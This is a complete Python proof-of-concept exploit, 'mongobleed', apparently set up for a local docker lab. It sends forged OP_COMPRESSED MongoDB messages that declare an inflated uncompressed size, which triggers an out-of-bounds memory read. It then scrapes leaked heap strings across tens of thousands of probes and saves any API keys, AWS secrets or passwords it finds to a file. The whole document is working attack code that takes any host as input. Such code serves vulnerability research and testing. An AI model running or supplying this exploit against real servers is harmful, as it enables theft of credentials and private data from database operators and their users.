#!/usr/bin/env python3
# docker compose down -v && docker compose up -d && sleep 10
# python3 mongobleed.py --host localhost

import socket, struct, zlib, re, argparse, time, os, subprocess

def probe(host, port, doc_len):
    bson = struct.pack('<i', doc_len) + b'\x10a\x00\x01\x00\x00\x00'  
    # '<i' = little-endian signed int (BSON doc length), 
    # '\x10' = int32 type, 'a\x00' = field name "a" null-terminated, 
    # '\x01\x00\x00\x00' = value 1
    payload = (struct.pack('<I', 2013) +  # '<I' = little-endian unsigned int, 2013 = original opcode (OP_MSG)
               struct.pack('<i', doc_len + 500) +  # Forged uncompressed size (larger than actual to trigger out-of-bounds read)
               b'\x02' +  # Compression type: 2 = zlib
               zlib.compress(struct.pack('<I', 0) + b'\x00' + bson))  # Compressed payload: flags (0) + section kind (0) + BSON doc
    try:
        s = socket.socket()  # Create TCP socket
        s.settimeout(2)  # 2 second timeout
        s.connect((host, port))  # Connect to MongoDB
        s.sendall(struct.pack('<IIII',  # '<IIII' = four little-endian unsigned ints (MongoDB wire protocol header)
                              16 + len(payload),  # messageLength: header (16 bytes) + payload
                              1,  # requestID: arbitrary client identifier
                              0,  # responseTo: 0 for client requests
                              2012) + payload)  # opCode: 2012 = OP_COMPRESSED
        # Receive full response from MongoDB
        response = b''
        while len(response) < 4:  # First, get the 4-byte length header
            response += s.recv(4096)
        msg_len = struct.unpack('<I', response[:4])[0]  # Total message length
        while len(response) < msg_len:  # Keep reading until we have the full message
            response += s.recv(4096)
        s.close()
        
        # check if it's compressed
        opcode = struct.unpack('<I', response[12:16])[0]  # opCode is at bytes 12-16
        if opcode == 2012:  # OP_COMPRESSED
            raw = zlib.decompress(response[25:])  # Skip 16-byte header + 9-byte compression header
        else:
            raw = response[16:]  # Skip 16-byte header only
        
        matches = re.findall(rb"field name '([^']+)'", raw)

        # Filter out boring/expected field names, keep only leaked data
        return [m for m in matches if m not in [b'?', b'a', b'$db', b'ping']]
    except: 
        return []

def run_exploit(host, port, max_offset):
    from concurrent.futures import ThreadPoolExecutor, as_completed
    
    all_leaked_bytes = bytearray()
    already_seen = set()
    
    # Run 50 probes at a time for speed
    with ThreadPoolExecutor(50) as pool:
        
        # Queue up one probe() call for each BSON length from 20 to max_offset
        # Each length reads from a different memory location
        jobs = {pool.submit(probe, host, port, length): length 
                for length in range(20, max_offset)}
        
        # Collect results as they complete
        for completed_job in as_completed(jobs):
            leaked_strings = completed_job.result()
            for s in leaked_strings:
                if s not in already_seen:
                    already_seen.add(s)
                    all_leaked_bytes.extend(s)
    
    return all_leaked_bytes.decode('utf-8', errors='replace')

if __name__ == '__main__':
    p = argparse.ArgumentParser()
    p.add_argument('--host', default='localhost')
    p.add_argument('--port', type=int, default=27017)
    p.add_argument('--container', default='mongobleed-target')
    p.add_argument('--max-offset', type=int, default=50000)
    p.add_argument('--output', default='leaked.txt')
    a = p.parse_args()
    output_path = os.path.abspath(a.output)
    
    for attempt in range(1, 6):  # Retry up to 5 times (memory layout varies)
        print(f"- Attempt {attempt}/5 | scanning {a.host}:{a.port}...")
        t = time.time()
        result = run_exploit(a.host, a.port, a.max_offset)
        if 'API_KEY' in result or 'AWS_SECRET' in result or 'PASSWORD_Super' in result:  # Check for secret patterns
            open(output_path, 'w').write(result)
            print(f"SUCCESS! Secrets leaked in {time.time()-t:.1f}s -> {output_path}")
            break
        else:
            print(f"No secrets found ({time.time()-t:.1f}s), retrying...")
    else:
        open(output_path, 'w').write(result)
        print(f"No secrets after 5 attempts. Output saved to {output_path}")
